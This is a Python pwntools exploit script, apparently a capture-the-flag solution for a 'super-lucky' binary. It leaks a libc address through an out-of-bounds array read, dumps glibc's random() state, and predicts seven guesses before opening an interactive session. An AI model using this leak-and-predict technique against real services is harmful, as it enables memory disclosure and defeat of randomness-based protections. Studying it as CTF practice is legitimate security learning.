#!/usr/bin/python3

from pwn import *

exe = ELF('super-lucky_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()


def leak(addr):
    idx = (addr-0x404040)//4
    sl(str(idx))
    p.recvuntil(b': ')
    return int(p.recvline()[:-1], 10) & 0xffffffff


p.recvuntil(b":")
libc.address = leak(0x403ff0) + (leak(0x403ff0+4) << 32) - 0x23fb0
info("libc.address " + hex(libc.address))

rptr = libc.address + 0x1ba1c4
fptr = rptr+0xc
info(f"rptf {hex(rptr)} fptr {hex(fptr)}")

leaks = []
for i in range(19):
    leaks.append(leak(rptr+(4*i)))
for i in range(7):
    print(str(((leaks[i]+leaks[i+3]) & 0xffffffff) >> 1))
    p.recvuntil(b"Enter guess #")
    p.sendline(str(((leaks[i]+leaks[i+3]) & 0xffffffff) >> 1))
    leaks[i+3] = leaks[i+3]+leaks[i]
p.interactive()
